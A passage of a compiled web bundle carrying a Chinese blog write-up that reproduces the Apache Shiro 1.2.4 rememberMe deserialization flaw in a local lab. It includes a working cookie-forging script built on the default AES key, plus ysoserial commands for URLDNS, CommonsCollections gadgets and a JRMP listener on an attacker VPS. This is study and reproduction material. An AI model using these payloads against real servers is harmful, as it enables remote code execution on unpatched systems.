"Cug6rRUP6+Nxy/zupy8zen+Npa0r/TCD5Cy40XjwlKsVUp91QqDOrGnt7KNbkUZPCG8+s780xNbX3qsy92Kjwv9RoDpZlrnbE7yBAL70bl5q0nShc/CmJeNbP/9ybToxM1cvY4UCpaLKwdourjzxCr6EvjFjtuAunpsRBBThSjIPKS6qyZj08ZY95LDA0WdSnRrDx/rCw12YgskcUIlstpPc7MPLRVjSWJ1ghIg7lXXVDLt0GeoGhsYp0kX2aANjOi3bfFv73Wuj49f5OxnLE3LrMskRI+GsynCjmZJLKb88Sjz7nByIMhZwvoCc6fmEZQyjOgnJFGlps3T+FfLkTcyoE1kvCNFfGnBLlX7TVbjo0ySB7k+6vYaQHny2yv1gZ8DyUq3+wbiIleI/RjDoHP07yiCRJHWT23/4AoYSyQAMAauW2E6Fw2/Mu+Ac3/qWLZ7LNOetqargbLwBbKc3uJJoG9Kb4KwjRjj7jmKh4GIIcRk5CujpBaiOKHfOIM/S"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),t._v(" encryptor"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("decrypt"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("base64"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("b64decode"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sys"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("argv"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325102536.png",alt:"image-20210325102536864"}})]),t._v(" "),s("h4",{attrs:{id:"cookie伪造"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#cookie伪造"}},[t._v("#")]),t._v(" Cookie伪造")]),t._v(" "),s("p",[t._v("同理，在Cookie伪造的时候使用随机十六位IV就可以：")]),t._v(" "),s("div",{staticClass:"language-python extra-class"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# python2")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" sys\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" base64\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" uuid\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" Crypto"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Cipher "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" AES\n\nkey "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"kPH+bIxk5D2deZiIxcaaaA=="')]),t._v("\nmode "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" AES"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("MODE_CBC\nIV "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" uuid"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("uuid4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),t._v("\nencryptor "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" AES"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("new"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("base64"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("b64decode"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("key"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" mode"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" IV"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\npayload "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" base64"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("b64decode"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sys"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("argv"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nBS "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" AES"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("block_size\npad "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("lambda")]),t._v(" s"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" s "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BS "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" BS"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("chr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BS "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" BS"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("encode"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\npayload "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" pad"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("base64"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("b64encode"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("IV "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" encryptor"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("encrypt"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("h2",{attrs:{id:"测试gadget"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#测试gadget"}},[t._v("#")]),t._v(" 测试Gadget")]),t._v(" "),s("h3",{attrs:{id:"urldns"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#urldns"}},[t._v("#")]),t._v(" URLDNS")]),t._v(" "),s("p",[t._v("URLDNS这条Gadget不需要其他依赖支持，一般用来测试target是否存在反序列化漏洞。")]),t._v(" "),s("p",[t._v("使用ysoserial生成序列化数据：")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://b8ftn5.dnslog.cn"')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("base64 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("':label;N;s/"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[t._v("\\n")]),t._v("//;b label'")]),t._v("\n")])])]),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112120.png",alt:"image-20210325112112935"}})]),t._v(" "),s("p",[t._v("再使用Cookie伪造脚本进行伪造：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112215.png",alt:"image-20210325112215534"}})]),t._v(" "),s("p",[t._v("然后发送Cookie：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112304.png",alt:"image-20210325112304118"}})]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112324.png",alt:"image-20210325112324441"}})]),t._v(" "),s("p",[t._v("收到了DNS查询请求，URLDNS Gadget验证成功，确实存在Java反序列化漏洞。")]),t._v(" "),s("h3",{attrs:{id:"cc2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#cc2"}},[t._v("#")]),t._v(" CC2")]),t._v(" "),s("p",[t._v("为了方便复现，之前本地添加了"),s("code",[t._v("commons-collections4")]),t._v("的依赖，而CC2这条Gadget完全依赖于"),s("code",[t._v("commons-collections4")]),t._v("，所以可以用CC2生成payload来测试，本地环境如下：")]),t._v(" "),s("ul",[s("li",[t._v("JDK 8u281")]),t._v(" "),s("li",[t._v("Tomcat 9.0.44")])]),t._v(" "),s("p",[t._v("生成序列化数据：")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"calc"')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("base64 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("':label;N;s/"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[t._v("\\n")]),t._v("//;b label'")]),t._v("\n")])])]),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325124659.png",alt:"image-20210325124659250"}})]),t._v(" "),s("p",[t._v("伪造Cookie：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325124718.png",alt:"image-20210325124718251"}})]),t._v(" "),s("p",[t._v("发送请求：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325124903.gif",alt:"1"}})]),t._v(" "),s("h3",{attrs:{id:"jrmp"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#jrmp"}},[t._v("#")]),t._v(" JRMP")]),t._v(" "),s("p",[t._v("使用"),s("code",[t._v("mvn dependency:list")]),t._v("命令可以查看Shiro中的依赖项，可以发现有"),s("code",[t._v("commons-collections 3.2.1")]),t._v("的依赖：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325145735.png",alt:"image-20210325145735900"}})]),t._v(" "),s("p",[t._v("但是尝试直接用ysoserial中的CC6这条Gadget生成的payload直接打的话并不能成功，而是会产生以下错误：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325145703.png",alt:"image-20210325145703717"}})]),t._v(" "),s("p",[s("s",[t._v("参考"),s("a",{attrs:{href:"https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("Go low – Exploiting JVM deserialization vulns despite a broken class loader (kapsi.fi)"),s("OutboundLink")],1),t._v("可知Shiro使用的ClassLoader不允许加载任何数组类型的对象，但是ysoserial中大多数的Gadget都依赖于下面两个类：")])]),t._v(" "),s("ul",[s("li",[s("p",[s("s",[t._v("ChainedTransformer：内部有一个数组类型的对象"),s("code",[t._v("iTransformers")]),t._v("，用于进行链式调用。")])])]),t._v(" "),s("li",[s("p",[s("s",[t._v("InvokerTransformer：内部传递给待调用的方法的参数是一个数组，但是如果方法的参数为空，则不影响使用。")])])])]),t._v(" "),s("p",[s("strong",[t._v("【已更新！】：真实原因并不是如上所述那么简单，详细原因见下面两篇文章：")])]),t._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://blog.zsxsoft.com/post/35",target:"_blank",rel:"noopener noreferrer"}},[t._v("强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考 - zsx's Blog (zsxsoft.com)"),s("OutboundLink")],1)]),t._v(" "),s("li",[s("a",{attrs:{href:"http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Shiro 1.2.4 RememberMe反序列化漏洞踩坑分析(CVE-2016-4437) | Rai4over's Blog"),s("OutboundLink")],1)])]),t._v(" "),s("p",[t._v("简言之，是因为Tomcat类加载（classpath）的问题，导致了无法加载除Java本身自带的数组。")]),t._v(" "),s("p",[t._v("解决这个问题的方法是使用JRMP，在VPS上执行下面的命令，监听端口，这里先用CC2 Gadget来测试：")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("12345")]),t._v(" CommonsCollections2 "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'calc'")]),t._v("\n")])])]),s("p",[t._v("使用ysoserial生成序列化数据，并伪造Cookie：")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"{VPS_IP}:12345"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("base64 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("':label;N;s/"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[t._v("\\n")]),t._v("//;b label'")]),t._v("\n···\npy -2 AES-en.py "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ser_data")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),s("p",[t._v("本地使用JDK8u281测试JRMP失败，于是我换成了JDK1.7，同时由于Tomcat9不支持Java7，所以更换为Tomcat8：")]),t._v(" "),s("ul",[s("li",[t._v("JDK 1.7")]),t._v(" "),s("li",[t._v("Tomcat 8.5.64")])]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325163717.png",alt:"image-20210325163717040"}})]),t._v(" "),s("p",[t._v("发送含有伪造的Cookie的请求，测试成功：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325163905.png",alt:"image-20210325163905782"}})]),t._v(" "),s("p",[t._v("因为我们之前手动添加了"),s("code",[t._v("commons-collections4")]),t._v("的依赖，所以这里使用CC2 Gadget可以成功执行命令，但是如果换成CC6 Gadget，虽然我们之前提到Shiro中含有"),s("code",[t._v("commons-collections 3.2.1")]),t._v("的依赖，但是本地测试并没有成功执行命令：")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("12345")]),t._v(" CommonsCollections6 "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"calc"')]),t._v("\n")])])]),s("p",[t._v("参考李三师傅的文章[shiro 反序列化复现 - 李三的剑谱](http://redteam.today/2019/09/20/shiro 反序列化复现/)可以知道，Shiro中的"),s("code",[t._v("commons-collections 3.2.1")]),t._v("依赖为"),s("code",[t._v("test")]),t._v("，而打包成"),s("code",[t._v("war")]),t._v("包的时候只会把"),s("code",[t._v("compile")]),t._v("和"),s("code",[t._v("runtime")]),t._v("的依赖打包，而"),s("code",[t._v("test")]),t._v("的依赖是在开发阶段使用的，也就是说实际运行环境中并没有"),s("code",[t._v("commons-collections 3.2.1")]),t._v("的依赖，原文如下：")]),t._v(" "),s("blockquote",[s("p",[t._v("然而本地测试的时候并未复现中，应该是gadget的问题，因为在加了commons-conllections4.0的环境用ysoserial的CommonsCollections2就可以成功。难道是环境没装好？")]),t._v(" "),s("p",[s("strong",[t._v("后来仔细看了一下，确实是环境的问题，具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的")]),t._v("。")])]),t._v(" "),s("p",[t._v("所以我们手动添加"),s("code",[t._v("commons-collections 3.2.1")]),t._v("的依赖，让其为"),s("code",[t._v("compile")]),t._v("：")]),t._v(" "),s("div",{staticClass:"language-xml extra-class"},[s("pre",{pre:!0,attrs:{class:"language-xml"}},[s("code",[t._v("        "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("commons-collections"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("commons-collections"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("3.2.1"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),s("p",[t._v("然后再次测试：")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("mvn clean "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("install")]),t._v("\n······\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"{VPS_IP}:12345"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("base64 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("':label;N;s/"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[t._v("\\n")]),t._v("//;b label'")]),t._v("\npy -2 AES-en.py "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ser_data")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n······\njava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("12345")]),t._v(" CommonsCollections6 "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"calc"')]),t._v("\n")])])]),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325170753.gif",alt:"1"}})]),t._v(" "),s("p",[t._v("再手动添加了"),s("code",[t._v("commons-collections 3.2.1")]),t._v("依赖之后，这次测试成功了。")]),t._v(" "),s("blockquote",[s("p",[t._v("正如李三师傅所说：")]),t._v(" "),s("p",[s("strong",[t._v("纯原生的shiro只是一个反序列化的触发点，没有完整gadget。因此需要结合其它依赖shiro的项目才有可能达到RCE的效果（比如jeecms）")])])]),t._v(" "),s("h2",{attrs:{id:"reference"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#reference"}},[t._v("#")]),t._v(" Reference")]),t._v(" "),s("p",[t._v("感谢几位师傅详尽的分析文章，让我这个菜鸡少踩了一些坑：")]),t._v(" "),s("p",[t._v("笑师傅："),s("a",{attrs:{href:"https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8",target:"_blank",rel:"noopener noreferrer"}},[t._v("Shiro 1.2.4 反序列化漏洞 | l3yx's blog"),s("OutboundLink")],1)]),t._v(" "),s("p",[t._v("李三师傅：[shiro 反序列化复现 - 李三的剑谱](http://redteam.today/2019/09/20/shiro 反序列化复现/)")]),t._v(" "),s("p",[s("a",{attrs:{href:"https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html#directory0592593546308368510",target:"_blank",rel:"noopener noreferrer"}},[t._v("Apache Shiro Java反序列化漏洞分析 - 贫民窟的艺术家 (joychou.org)"),s("OutboundLink")],1)]),t._v(" "),s("p",[s("a",{attrs:{href:"https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("Go low – Exploiting JVM deserialization vulns despite a broken class loader (kapsi.fi)"),s("OutboundLink")],1)]),t._v(" "),s("p",[s("a",{attrs:{href:"https://www.jianshu.com/p/45848dd484a9",target:"_blank",rel:"noopener noreferrer"}},[t._v("关于AES加解密中CBC模式的IV初始化向量的安全性问题 - 简书 (jianshu.com)"),s("OutboundLink")],1)]),t._v(" "),s("p",[t._v("https://issues.apache.org/jira/browse/SHIRO-550")])])}),[],!1,null,null,null);a.default=n.exports}}]);